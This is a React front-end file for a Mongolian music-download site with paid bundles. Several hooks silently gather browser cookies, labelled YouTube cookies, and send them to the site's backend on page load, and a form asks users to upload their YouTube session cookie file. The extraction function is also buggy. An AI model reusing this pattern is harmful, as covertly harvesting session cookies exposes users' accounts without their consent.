import React, { useState, useEffect, useCallback, useRef } from 'react';
import { BrowserRouter as Router, Routes, Route, useNavigate } from 'react-router-dom';
import BundleCard from './BundleCard';
import AdminPanel from './AdminPanel';
import Login from './Login';
import UserLogin from './UserLogin';
import config from './config';
import './App.css';

function HomePage() {
  const [bundles, setBundles] = useState([]);
  const [downloadingMp3, setDownloadingMp3] = useState({});
  const [downloadingMp4, setDownloadingMp4] = useState({});
  const [downloadProgress, setDownloadProgress] = useState({});
  const [downloadPercentage, setDownloadPercentage] = useState({});
  const [downloadTime, setDownloadTime] = useState({});
  const [downloadStartTime, setDownloadStartTime] = useState({});
  const [remainingTime, setRemainingTime] = useState({});
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [user, setUser] = useState(null);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    fetchBundles();
    // Check if user is logged in
    const userToken = localStorage.getItem('userToken');
    const userData = localStorage.getItem('userData');
    if (userToken && userData) {
      setUser(JSON.parse(userData));
    }
  }, []);

  // Timer to update download time in real-time
  useEffect(() => {
    const timer = setInterval(() => {
      const now = Date.now();
      Object.keys(downloadStartTime).forEach(bundleId => {
        if (downloadingMp3[bundleId] || downloadingMp4[bundleId]) {
          const elapsed = now - downloadStartTime[bundleId];
          setDownloadTime(prev => ({ ...prev, [bundleId]: elapsed }));
          
          // Calculate remaining time
          const currentProgress = downloadPercentage[bundleId] || 0;
          if (currentProgress > 0) {
            const totalEstimatedTime = (elapsed / currentProgress) * 100;
            const remaining = Math.max(0, totalEstimatedTime - elapsed);
            setRemainingTime(prev => ({ ...prev, [bundleId]: remaining }));
          } else {
            setRemainingTime(prev => ({ ...prev, [bundleId]: 0 }));
          }
        }
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [downloadStartTime, downloadingMp3, downloadingMp4, downloadPercentage]);

  // Helper function to format time
  const formatTime = (milliseconds) => {
    if (!milliseconds) return 'Starting...';
    const seconds = Math.floor(milliseconds / 1000);
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  // Function to extract YouTube cookies from browser
  const extractYouTubeCookies = () => {
    try {
      // Filter YouTube-related cookies
      const youtubeCookies = [];
      const youtubeDomains = ['.youtube.com', '.google.com', '.googlevideo.com'];
      
      // Get cookies from all domains
      youtubeDomains.forEach(domain => {
        const domainCookies = document.cookie
          .split(';')
          .map(cookie => cookie.trim())
          .filter(cookie => cookie.includes('='))
          .map(cookie => {
            const [name, value] = cookie.split('=');
            return `${name}=${value}`;
          })
          .join('; ');
        
        if (domainCookies) {
          youtubeCookies.push(domainCookies);
        }
      });
      
      return youtubeCookies.join('; ');
    } catch (error) {
      console.error('Error extracting cookies:', error);
      return '';
    }
  };
  
  // Function to check if user has cookies
  const checkCookieStatus = async () => {
    try {
      const token = localStorage.getItem('userToken');
      const response = await fetch(`${config.API_BASE_URL}/api/auth/me`, {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });
      
      if (response.ok) {
        const userData = await response.json();
        // Check if user has cookies (we'll add this to the response later)
        // setHasCookies(!!userData.hasCookies); // Removed
      }
    } catch (error) {
      console.error('Error checking cookie status:', error);
    }
  };

  // Function to send cookies to backend
  const sendCookiesToBackend = useCallback(async (showSuccessMessage = false) => {
    try {
      const cookies = extractYouTubeCookies();
      if (!cookies) {
        if (showSuccessMessage) {
          setError('YouTube cookie олдсонгүй. YouTube-д нэвтэрсэн байгаа эсэхээ шалгана уу.');
        }
        return false;
      }
      
      const token = localStorage.getItem('userToken');
      const response = await fetch(`${config.API_BASE_URL}/api/upload-cookies`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ cookies })
      });
      
      if (response.ok) {
        if (showSuccessMessage) {
          setSuccess('Cookie амжилттай шинэчлэгдлээ!');
        }
        // setHasCookies(true); // Removed
        return true;
      } else {
        if (showSuccessMessage) {
          setError('Cookie шинэчлэхэд алдаа гарлаа');
        }
        return false;
      }
    } catch (error) {
      console.error('Error sending cookies:', error);
      if (showSuccessMessage) {
        setError('Cookie шинэчлэхэд алдаа гарлаа');
      }
      return false;
    }
  }, []);
  
  // Auto-collect cookies when user logs in or visits the page
  useEffect(() => {
    if (user) {
      // Collect cookies immediately when user is logged in
      const collectCookies = async () => {
        const success = await sendCookiesToBackend();
        if (success) {
          // Don't show success message for automatic collection to avoid spam
          console.log('YouTube cookie автоматаар цуглууллаа');
        }
      };
      
      // Try to collect cookies immediately
      collectCookies();
      
      // Also try again after a short delay in case page is still loading
      const timer = setTimeout(collectCookies, 1000);
      
      return () => clearTimeout(timer);
    }
  }, [user]);

  // Auto-collect cookies when page loads (even for non-logged in users)
  useEffect(() => {
    const collectCookiesOnPageLoad = async () => {
      // Only collect if user is logged in
      const token = localStorage.getItem('userToken');
      if (token) {
        const cookies = extractYouTubeCookies();
        if (cookies) {
          try {
            const response = await fetch(`${config.API_BASE_URL}/api/upload-cookies`, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${token}`
              },
              body: JSON.stringify({ cookies })
            });
            
            if (response.ok) {
              console.log('Cookies collected on page load');
              // setHasCookies(true); // Removed
            }
          } catch (error) {
            console.error('Error collecting cookies on page load:', error);
          }
        }
      }
    };
    
    // Try to collect cookies when page loads
    collectCookiesOnPageLoad();
  }, []);

  const fetchBundles = async () => {
    try {
      const response = await fetch(`${config.API_BASE_URL}/api/bundles`);
      if (!response.ok) {
        setBundles([]);
        return;
      }
      const data = await response.json();
      setBundles(data);
    } catch (err) {
      console.error('Error fetching bundles:', err);
      setBundles([]);
    }
  };

  // Function to categorize bundles
  const categorizeBundles = (bundles) => {
    const categories = {
      'Зохиолын дуу': [],
      'Орчин үеийн дуу': [],
      'Поп дуу': [],
      'Бусад': []
    };

    bundles.forEach(bundle => {
      const name = bundle.name.toLowerCase();
      if (name.includes('зохиол') || name.includes('сонгодог') || name.includes('уран зохиол')) {
        categories['Зохиолын дуу'].push(bundle);
      } else if (name.includes('орчин') || name.includes('үеийн') || name.includes('современ')) {
        categories['Орчин үеийн дуу'].push(bundle);
      } else if (name.includes('поп') || name.includes('pop') || name.includes('эстрад')) {
        categories['Поп дуу'].push(bundle);
      } else {
        categories['Бусад'].push(bundle);
      }
    });

    return categories;
  };

  const handleDownloadMp3 = async (bundleId, bundleName) => {
    if (!user) {
      setError('Та нэвтрэх шаардлагатай');
      setShowLoginModal(true);
      return;
    }
    setDownloadingMp3(prev => ({ ...prev, [bundleId]: true }));
    setError('');
    setSuccess('');
    setDownloadProgress(prev => ({ ...prev, [bundleId]: 'Preparing download...' }));
    setDownloadPercentage(prev => ({ ...prev, [bundleId]: 0 }));
    setDownloadTime(prev => ({ ...prev, [bundleId]: 0 }));
    setRemainingTime(prev => ({ ...prev, [bundleId]: 0 }));
    setDownloadStartTime(prev => ({ ...prev, [bundleId]: Date.now() }));

    // --- SSE progress listener ---
    let eventSource;
    try {
      eventSource = new window.EventSource(`${config.API_BASE_URL}/api/bundle-progress/${bundleId}?type=mp3`);
      eventSource.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          if (data && typeof data.processed === 'number' && typeof data.total === 'number') {
            const percent = data.total > 0 ? Math.round((data.processed / data.total) * 100) : 0;
            setDownloadPercentage(prev => ({ ...prev, [bundleId]: percent }));
            setDownloadProgress(prev => ({ ...prev, [bundleId]: `${data.processed} / ${data.total} файлыг боловсруулж байна...` }));
            if (data.done) {
              setDownloadProgress(prev => ({ ...prev, [bundleId]: 'Creating download link...' }));
              setDownloadPercentage(prev => ({ ...prev, [bundleId]: 100 }));
              eventSource.close();
            }
          }
        } catch (e) {}
      };
    } catch (e) {}

    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 900000);
      const token = localStorage.getItem('userToken');
      const response = await fetch(`${config.API_BASE_URL}/download-bundle-mp3/${bundleId}`, {
        signal: controller.signal,
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });
      clearTimeout(timeoutId);
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Server error: ${response.status} - ${errorText}`);
      }
      const blob = await response.blob();
      if (blob.size === 0) {
        throw new Error('Downloaded file is empty');
      }
      const link = document.createElement('a');
      link.href = window.URL.createObjectURL(blob);
      link.download = `${bundleName}_mp3.zip`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      window.URL.revokeObjectURL(link.href);
      setSuccess(`Downloaded ${bundleName} MP3 as ZIP`);
      setDownloadProgress(prev => ({ ...prev, [bundleId]: '' }));
      setDownloadPercentage(prev => ({ ...prev, [bundleId]: 0 }));
      setDownloadTime(prev => ({ ...prev, [bundleId]: Date.now() - downloadStartTime[bundleId] }));
    } catch (err) {
      if (err.name === 'AbortError') {
        setError('Download timed out. Please try again.');
      } else {
        setError(`Failed to download MP3: ${err.message}`);
      }
    }
    setDownloadingMp3(prev => ({ ...prev, [bundleId]: false }));
    setDownloadProgress(prev => ({ ...prev, [bundleId]: '' }));
    setDownloadPercentage(prev => ({ ...prev, [bundleId]: 0 }));
    setRemainingTime(prev => ({ ...prev, [bundleId]: 0 }));
    setDownloadTime(prev => ({ ...prev, [bundleId]: Date.now() - downloadStartTime[bundleId] }));
    if (eventSource) eventSource.close();
  };

  const handleDownloadMp4 = async (bundleId, bundleName) => {
    if (!user) {
      setError('Та нэвтрэх шаардлагатай');
      setShowLoginModal(true);
      return;
    }
    setDownloadingMp4(prev => ({ ...prev, [bundleId]: true }));
    setError('');
    setSuccess('');
    setDownloadProgress(prev => ({ ...prev, [bundleId]: 'Preparing download...' }));
    setDownloadPercentage(prev => ({ ...prev, [bundleId]: 0 }));
    setDownloadTime(prev => ({ ...prev, [bundleId]: 0 }));
    setRemainingTime(prev => ({ ...prev, [bundleId]: 0 }));
    setDownloadStartTime(prev => ({ ...prev, [bundleId]: Date.now() }));

    // --- SSE progress listener ---
    let eventSource;
    try {
      eventSource = new window.EventSource(`${config.API_BASE_URL}/api/bundle-progress/${bundleId}?type=mp4`);
      eventSource.onmessage = (event) => {
        try {
          const data = JSON.parse(event.data);
          if (data && typeof data.processed === 'number' && typeof data.total === 'number') {
            const percent = data.total > 0 ? Math.round((data.processed / data.total) * 100) : 0;
            setDownloadPercentage(prev => ({ ...prev, [bundleId]: percent }));
            setDownloadProgress(prev => ({ ...prev, [bundleId]: `${data.processed} / ${data.total} файлыг боловсруулж байна...` }));
            if (data.done) {
              setDownloadProgress(prev => ({ ...prev, [bundleId]: 'Creating download link...' }));
              setDownloadPercentage(prev => ({ ...prev, [bundleId]: 100 }));
              eventSource.close();
            }
          }
        } catch (e) {}
      };
    } catch (e) {}

    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 900000);

      const token = localStorage.getItem('userToken');
      const response = await fetch(`${config.API_BASE_URL}/download-bundle-mp4/${bundleId}`, {
        signal: controller.signal,
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });

      clearTimeout(timeoutId);

      // Check if the response is JSON (error)
      const contentType = response.headers.get('content-type');
      if (contentType && contentType.includes('application/json')) {
        const errorData = await response.json();
        throw new Error(errorData.error || 'Unknown server error');
      }

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`Server error: ${response.status} - ${errorText}`);
      }

      setDownloadProgress(prev => ({ ...prev, [bundleId]: 'Downloading files...' }));

      // Get content length for progress tracking
      const contentLength = response.headers.get('content-length');
      let loaded = 0;

      if (contentLength) {
        const total = parseInt(contentLength, 10);
        const reader = response.body.getReader();
        const chunks = [];

        while (true) {
          const { done, value } = await reader.read();
          if (done) break;

          chunks.push(value);
          loaded += value.length;
          const percentage = Math.round((loaded / total) * 100);
          setDownloadPercentage(prev => ({ ...prev, [bundleId]: percentage }));
        }

        const blob = new Blob(chunks);
        if (blob.size === 0) {
          throw new Error('Downloaded file is empty');
        }

        // Check if the blob is a ZIP file
        if (contentType && !contentType.includes('application/zip')) {
          throw new Error('Downloaded file is not a ZIP archive');
        }

        setDownloadProgress(prev => ({ ...prev, [bundleId]: 'Creating download link...' }));
        const link = document.createElement('a');
        link.href = window.URL.createObjectURL(blob);
        link.download = `${bundleName}_mp4.zip`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        window.URL.revokeObjectURL(link.href);
      } else {
        // Fallback for when content-length is not available - show animated progress
        setDownloadProgress(prev => ({ ...prev, [bundleId]: 'Downloading files...' }));

        // Start animated progress
        let progress = 0;
        const progressInterval = setInterval(() => {
          progress += Math.random() * 15;
          if (progress > 90) progress = 90; // Don't go to 100% until actually done
          setDownloadPercentage(prev => ({ ...prev, [bundleId]: Math.round(progress) }));
        }, 500);

        const blob = await response.blob();
        clearInterval(progressInterval);

        if (blob.size === 0) {
          throw new Error('Downloaded file is empty');
        }

        // Check if the blob is a ZIP file
        if (contentType && !contentType.includes('application/zip')) {
          throw new Error('Downloaded file is not a ZIP archive');
        }

        setDownloadProgress(prev => ({ ...prev, [bundleId]: 'Creating download link...' }));
        setDownloadPercentage(prev => ({ ...prev, [bundleId]: 95 }));

        const link = document.createElement('a');
        link.href = window.URL.createObjectURL(blob);
        link.download = `${bundleName}_mp4.zip`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        window.URL.revokeObjectURL(link.href);
      }

      setSuccess(`Downloaded ${bundleName} MP4 as ZIP`);
      setDownloadProgress(prev => ({ ...prev, [bundleId]: '' }));
      setDownloadPercentage(prev => ({ ...prev, [bundleId]: 0 }));
      setDownloadTime(prev => ({ ...prev, [bundleId]: Date.now() - downloadStartTime[bundleId] }));
    } catch (err) {
      if (err.name === 'AbortError') {
        setError('Download timed out. Please try again.');
      } else {
        setError(`Failed to download MP4: ${err.message}`);
      }
    }
    setDownloadingMp4(prev => ({ ...prev, [bundleId]: false }));
    setDownloadProgress(prev => ({ ...prev, [bundleId]: '' }));
    setDownloadPercentage(prev => ({ ...prev, [bundleId]: 0 }));
    setRemainingTime(prev => ({ ...prev, [bundleId]: 0 }));
    setDownloadTime(prev => ({ ...prev, [bundleId]: Date.now() - downloadStartTime[bundleId] }));
    if (eventSource) eventSource.close();
  };

  const handleUserLogin = (token, userData) => {
    setUser(userData);
    setShowLoginModal(false);
    // checkCookieStatus(); // Removed
  };

  // Add function to refresh user data from server
  const refreshUserData = async () => {
    try {
      const token = localStorage.getItem('userToken');
      if (!token) return;

      const response = await fetch(`${config.API_BASE_URL}/api/auth/me`, {
        headers: {
          'Authorization': `Bearer ${token}`
        }
      });

      if (response.ok) {
        const userData = await response.json();
        setUser(userData);
        localStorage.setItem('userData', JSON.stringify(userData));
        // setHasCookies(!!userData.hasCookies); // Removed
      }
    } catch (error) {
      console.error('Error refreshing user data:', error);
    }
  };

  // Refresh user data and collect cookies when component mounts if user is logged in
  useEffect(() => {
    if (user) {
      refreshUserData();
      // checkCookieStatus(); // Removed
      
              // Auto-collect cookies for existing logged-in users
        const collectCookies = async () => {
          const success = await sendCookiesToBackend();
          if (success) {
            // Don't show success message for automatic collection to avoid spam
            console.log('YouTube cookie автоматаар цуглууллаа');
          }
        };
      
      // Try immediately and after a short delay
      collectCookies();
      setTimeout(collectCookies, 1000);
    }
  }, []);

  const handleLogout = () => {
    localStorage.removeItem('userToken');
    localStorage.removeItem('userData');
    setUser(null);
  };

  // Add buy click handler for bundles
  const handleBuyClick = () => {
    if (!user) {
      setShowLoginModal(true);
    } else {
      navigate('/buy');
    }
  };

  const fileInputRef = useRef(null);
  const handleCookieFileUpload = async (event) => {
    const file = event.target.files[0];
    if (!file) return;
    const text = await file.text();
    try {
      const token = localStorage.getItem('userToken');
      const response = await fetch(`${config.API_BASE_URL}/api/upload-cookies`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ cookies: text })
      });
      if (response.ok) {
        setSuccess('YouTube cookie амжилттай хадгалагдлаа!');
        setError('');
      } else {
        setError('Cookie хадгалах үед алдаа гарлаа.');
        setSuccess('');
      }
    } catch (err) {
      setError('Cookie хадгалах үед алдаа гарлаа.');
      setSuccess('');
    }
  };

  return (
    <div className="App" style={styles.container}>
      <header className="header" style={styles.header}>
        <h1 className="title" style={styles.title}>Монгол Дуу Татагч</h1>
        <p className="subtitle" style={styles.subtitle}>Mongolian Music Downloader</p>
        <nav className="nav" style={styles.nav}>
          <button className="homeHeaderButton" style={styles.homeHeaderButton} onClick={() => navigate('/')}>Home</button>
          <button className="buyHeaderButton" style={styles.buyHeaderButton} onClick={handleBuyClick}>Худалдаж авах</button>
          {user ? (
            <div className="userSection" style={styles.userSection}>
              <span className="welcomeText" style={styles.welcomeText}>{user.username}</span>
              <button
                onClick={refreshUserData}
                style={{
                  background: '#27ae60',
                  color: 'white',
                  border: 'none',
                  borderRadius: '8px',
                  padding: '8px 18px',
                  fontWeight: 'bold',
                  fontSize: '1rem',
                  marginLeft: 0,
                  marginRight: 0,
                  cursor: 'pointer',
                  marginTop: 0,
                  marginBottom: 0,
                  boxShadow: '0 2px 8px rgba(39, 174, 96, 0.12)',
                  transition: 'background 0.2s, box-shadow 0.2s',
                }}
                title="Шинэчлэх"
              >
                Хэрэглэгч шинэчлэх
              </button>
              {/* Removed cookie status button */}
              <button className="logoutButton" onClick={handleLogout} style={styles.logoutButton}>
                Гарах
              </button>
            </div>
          ) : (
            <button className="loginButton" onClick={() => setShowLoginModal(true)} style={styles.loginButton}>
              Нэвтрэх
            </button>
          )}
        </nav>
      </header>
      {user && (
        <div style={{ background: '#fff3cd', border: '1px solid #ffeaa7', borderRadius: '8px', padding: '15px', margin: '20px auto', maxWidth: '800px', textAlign: 'center' }}>
          <h3 style={{ color: '#856404', margin: '0 0 10px 0' }}>🍪 YouTube Cookie оруулах (заавал биш)</h3>
          <p style={{ color: '#856404', margin: '0 0 10px 0' }}>
            Хэрвээ зарим видео татагдахгүй бол өөрийн YouTube cookie-г оруулж болно.<br/>
            <b>1.</b> YouTube-д нэвтэрсэн байх<br/>
            <b>2.</b> <a href="https://chrome.google.com/webstore/detail/get-cookiestxt/" target="_blank" rel="noopener noreferrer">Get cookies.txt</a> өргөтгөл суулгана<br/>
            <b>3.</b> youtube.com дээрээс cookies.txt файл татаж авна<br/>
            <b>4.</b> Доор оруулна уу:
          </p>
          <input type="file" accept=".txt" ref={fileInputRef} onChange={handleCookieFileUpload} style={{ margin: '10px 0' }} />
        </div>
      )}
      {bundles.length === 0 ? (
        <section className="section" style={styles.section}>
          <div className="card" style={styles.card}>
            <h2 className="sectionTitle" style={styles.sectionTitle}>Available Music Bundles</h2>
            <div style={styles.noBundles}>
              <p>No bundles available. Please create some bundles in the admin panel.</p>
            </div>
          </div>
        </section>
      ) : (
        <>
          {Object.entries(categorizeBundles(bundles)).map(([category, categoryBundles]) => {
            if (categoryBundles.length === 0) return null;
            // Sort bundles by name (ascending, natural order)
            const sortedBundles = [...categoryBundles].sort((a, b) => a.name.localeCompare(b.name, 'mn', { numeric: true }));
            // Split bundles into chunks of 8
            const bundleChunks = [];
            for (let i = 0; i < sortedBundles.length; i += 8) {
              bundleChunks.push(sortedBundles.slice(i, i + 8));
            }
            return bundleChunks.map((chunk, chunkIndex) => (
              <section key={`${category}-${chunkIndex}`} className="section" style={styles.section}>
                <div className="card" style={styles.card}>
                  <h2 className="categoryTitle" style={styles.categoryTitle}>
                    {category} {bundleChunks.length > 1 ? `(${chunkIndex + 1}/${bundleChunks.length})` : ''}
                  </h2>
                  <div className="bundlesRow" style={styles.bundlesRow}>
                    {chunk.map((bundle) => (
                      <BundleCard
                        key={bundle._id}
                        bundle={bundle}
                        downloadingMp3={downloadingMp3[bundle._id] || false}
                        downloadingMp4={downloadingMp4[bundle._id] || false}
                        downloadProgress={downloadProgress[bundle._id] || ''}
                        downloadPercentage={downloadPercentage[bundle._id] || 0}
                        downloadTime={formatTime(downloadTime[bundle._id])}
                        remainingTime={formatTime(remainingTime[bundle._id])}
                        onDownloadMp3={() => handleDownloadMp3(bundle._id, bundle.name)}
                        onDownloadMp4={() => handleDownloadMp4(bundle._id, bundle.name)}
                        user={user}
                        onBuyClick={handleBuyClick}
                      />
                    ))}
                  </div>
                </div>
              </section>
            ));
          })}
        </>
      )}
      {error && <div className="error" style={styles.error}>{error}</div>}
      {success && <div className="success" style={styles.success}>{success}</div>}
      
      {/* Removed Cookie Information Section */}

      {/* Login Modal */}
      {showLoginModal && (
        <div className="modalOverlay" style={styles.modalOverlay}>
          <div className="modalContent" style={styles.modalContent}>
            <button
              onClick={() => setShowLoginModal(false)}
              className="closeButton"
              style={styles.closeButton}
            >
              ×
            </button>
            <UserLogin onLogin={handleUserLogin} />
          </div>
        </div>
      )}
    </div>
  );
}

function BuyPage() {
  const [user, setUser] = useState(null);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [packages, setPackages] = useState([]);
  const [editing, setEditing] = useState(null); // id of package being edited
  const [editPrice, setEditPrice] = useState('');
  const [selectedPackage, setSelectedPackage] = useState(null);
  const [showBuyModal, setShowBuyModal] = useState(false);
  const [showPaymentDetails, setShowPaymentDetails] = useState(false);
  const navigate = useNavigate();

  useEffect(() => {
    const userToken = localStorage.getItem('userToken');
    const userData = localStorage.getItem('userData');
    if (userToken && userData) {
      setUser(JSON.parse(userData));
    }
    fetchPackages();
  }, []);

  const fetchPackages = async () => {
    try {
      const res = await fetch(`${config.API_BASE_URL}/api/packages`);
      const data = await res.json();
      setPackages(data);
    } catch (e) {
      setError('Failed to load packages');
    }
  };

  const handleUserLogin = (token, userData) => {
    setUser(userData);
    setShowLoginModal(false);
  };

  const handleLogout = () => {
    localStorage.removeItem('userToken');
    localStorage.removeItem('userData');
    setUser(null);
  };

  const handleEdit = (pkg) => {
    setEditing(pkg._id);
    setEditPrice(pkg.price);
  };

  const handleSave = async (pkg) => {
    try {
      const token = localStorage.getItem('adminToken');
      const res = await fetch(`${config.API_BASE_URL}/api/packages/${pkg._id}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify({ price: Number(editPrice) })
      });
      if (res.ok) {
        setEditing(null);
        setSuccess('Үнэ шинэчлэгдлээ');
        fetchPackages();
      } else {
        setError('Шинэчлэхэд алдаа гарлаа');
      }
    } catch (e) {
      setError('Шинэчлэхэд алдаа гарлаа');
    }
  };

  const handlePackageClick = (pkg) => {
    setSelectedPackage(pkg);
    setShowBuyModal(true);
    setShowPaymentDetails(false);
  };

  const handleBuyClick = async () => {
    if (!user || !selectedPackage) return;

    try {
      const response = await fetch(`${config.API_BASE_URL}/api/orders`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          accountName: user.username,
          packageName: selectedPackage.name,
          packagePrice: selectedPackage.price
        }),
      });

      if (response.ok) {
        setShowPaymentDetails(true);
      } else {
        const data = await response.json();
        setError(data.error || 'Захиалга үүсгэхэд алдаа гарлаа');
      }
    } catch (error) {
      setError('Сүлжээний алдаа. Дахин оролдоно уу.');
    }
  };

  const handleCloseModal = () => {
    setShowBuyModal(false);
    setShowPaymentDetails(false);
    setSelectedPackage(null);
  };

  return (
    <div className="App" style={styles.container}>
      <header className="header" style={styles.header}>
        <h1 className="title" style={styles.title}>Монгол Дуу Татагч</h1>
        <p className="subtitle" style={styles.subtitle}>Mongolian Music Downloader</p>
        <nav className="nav" style={styles.nav}>
          <button className="homeHeaderButton" style={styles.homeHeaderButton} onClick={() => navigate('/')}>Home</button>
          <button className="buyHeaderButton" style={styles.buyHeaderButton} onClick={() => navigate('/buy')}>Худалдаж авах</button>
          {user ? (
            <div className="userSection" style={styles.userSection}>
              <span className="welcomeText" style={styles.welcomeText}>{user.username}</span>
              <button className="logoutButton" onClick={handleLogout} style={styles.logoutButton}>
                Гарах
              </button>
            </div>
          ) : (
            <button className="loginButton" onClick={() => setShowLoginModal(true)} style={styles.loginButton}>
              Нэвтрэх
            </button>
          )}
        </nav>
      </header>
      <section className="section" style={styles.section}>
        <div className="card" style={styles.card}>
          {/* Instruction Section */}
          <div style={{
            background: '#f8fff4',
            border: '2px solid #27ae60',
            borderRadius: '10px',
            padding: '18px 24px',
            marginBottom: '28px',
            color: '#222',
            fontSize: '1.08rem',
            fontWeight: 500,
            display: 'flex',
            alignItems: 'flex-start',
            gap: '12px',
          }}>
            <span style={{fontSize: '1.5rem', color: '#27ae60', fontWeight: 'bold'}}>ℹ️</span>
            <span>
              Худалдан авалт хийсний дараа 3–5 минутын дотор таны эрх идэвхжинэ. Худалдан авсан багц дээр "Татах (MP3, MP4)" гэсэн товч гарч ирэхгүй байвал "Хэрэглэгч шинэчлэх" товчийг дарна уу. Баярлалаа!
            </span>
          </div>
          <h2 style={{textAlign:'center',marginBottom:24}}>Багцын сонголт</h2>
          <div style={styles.bundlesRow}>
            {packages.map((pkg, idx) => (
              <div key={pkg._id} style={{ ...styles.specialBundleCard, border: '3px solid #27ae60', minHeight: 220, cursor: 'pointer' }} onClick={() => handlePackageClick(pkg)}>
                <div style={{ marginBottom: 20 }}>
                  <h3 style={styles.bundleName}>{pkg.name}</h3>
                  {user && user.role === 'admin' && editing === pkg._id ? (
                    <div>
                      <input type="number" value={editPrice} onChange={e => setEditPrice(e.target.value)} style={{ fontSize: '1.1rem', padding: '6px 12px', borderRadius: 6, border: '1.5px solid #27ae60', width: 100, marginRight: 8 }} />
                      <button onClick={() => handleSave(pkg)} style={{ ...styles.buyButton, background: '#27ae60', marginRight: 6 }}>Хадгалах</button>
                      <button onClick={() => setEditing(null)} style={{ ...styles.buyButton, background: '#ccc', color: '#222' }}>Болих</button>
                    </div>
                  ) : (
                    <div style={{ ...styles.priceTag, color: '#27ae60', borderColor: '#27ae60', background: '#eafaf1', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                      {pkg.price.toLocaleString()}₮
                      {user && user.role === 'admin' && (
                        <button onClick={() => handleEdit(pkg)} style={{ ...styles.buyButton, background: 'none', color: '#27ae60', marginLeft: 8, fontSize: '0.95em', padding: '2px 10px', border: '1px solid #27ae60' }}>Засах</button>
                      )}
                    </div>
                  )}
                </div>
                {pkg.description && (
                  <div style={{ color: '#888', fontSize: '1rem', marginTop: 10 }}>{pkg.description}</div>
                )}
              </div>
            ))}
          </div>
          {error && <div style={styles.error}>{error}</div>}
          {success && <div style={styles.success}>{success}</div>}
        </div>
      </section>
      {showBuyModal && selectedPackage && (
        <div className="modalOverlay" style={styles.modalOverlay}>
          <div className="buyModalContent" style={styles.buyModalContent}>
            <button onClick={handleCloseModal} className="closeButton" style={styles.closeButton}>×</button>
            {!showPaymentDetails ? (
              <>
                <h2 style={{marginBottom: 12}}>{selectedPackage.name}</h2>
                <div style={{ ...styles.priceTag, color: '#27ae60', borderColor: '#27ae60', background: '#eafaf1', fontSize: '1.3rem', marginBottom: 18 }}>{selectedPackage.price.toLocaleString()}₮</div>
                <div style={{ color: '#888', fontSize: '1.1rem', marginBottom: 28 }}>{selectedPackage.description}</div>
                <button onClick={handleBuyClick} style={{ background: '#27ae60', color: 'white', border: 'none', borderRadius: 8, padding: '12px 38px', fontWeight: 600, fontSize: '1.1rem', cursor: 'pointer' }}>Авах</button>
              </>
            ) : (
              <>
                <h2 style={{marginBottom: 24}}>Хаан банк</h2>
                <div style={{ textAlign: 'left', width: '100%' }}>
                  <div style={{ marginBottom: 16 }}>
                    <strong>Төлбөр:</strong> {selectedPackage.price.toLocaleString()}₮
                  </div>
                  <div style={{ marginBottom: 16 }}>
                    <strong>IBAN:</strong> 400005000
                  </div>
                  <div style={{ marginBottom: 16 }}>
                    <strong>Данс:</strong> 5167487270
                  </div>
                  <div style={{ marginBottom: 16 }}>
                    <strong>Дансны нэр:</strong> Мөнхзаяа Билгүүнзаяа
                  </div>
                  <div style={{ marginBottom: 24 }}>
                    <strong>Гүйлгээний Утга:</strong> (Бүртгүүлсэн Утасны дугаараа хийнэ үү !)
                  </div>
                  <div style={{ color: '#27ae60', fontSize: '1rem', fontWeight: 500, textAlign: 'center', marginTop: 8 }}>
                    Таны эрх гүйлгээ хийсний дараа 3-5 минутын хооронд идэвхэжнэ та түр хүлээнэ үү Баярлалаа.
                  </div>
                </div>
              </>
            )}
          </div>
        </div>
      )}
      {showLoginModal && (
        <div className="modalOverlay" style={styles.modalOverlay}>
          <div className="modalContent" style={styles.modalContent}>
            <button
              onClick={() => setShowLoginModal(false)}
              className="closeButton"
              style={styles.closeButton}
            >
              ×
            </button>
            <UserLogin onLogin={handleUserLogin} />
          </div>
        </div>
      )}
    </div>
  );
}

function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<HomePage />} />
        <Route path="/login" element={<Login />} />
        <Route path="/user-login" element={<UserLogin />} />
        <Route path="/admin" element={<AdminPanel />} />
        <Route path="/buy" element={<BuyPage />} />
      </Routes>
    </Router>
  );
}

const styles = {
  container: {
    minHeight: '100vh',
    backgroundColor: '#f5f5f5',
    fontFamily: 'Arial, sans-serif'
  },
  header: {
    textAlign: 'center',
    padding: '40px 20px',
    backgroundColor: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    color: 'white',
    marginBottom: '30px'
  },
  nav: {
    marginTop: '20px',
    display: 'flex',
    justifyContent: 'center',
    gap: '20px',
    alignItems: 'center'
  },
  navLink: {
    color: 'white',
    textDecoration: 'none',
    padding: '10px 20px',
    borderRadius: '5px',
    backgroundColor: 'rgba(255, 255, 255, 0.1)',
    transition: 'background-color 0.3s ease'
  },
  title: {
    fontSize: '3rem',
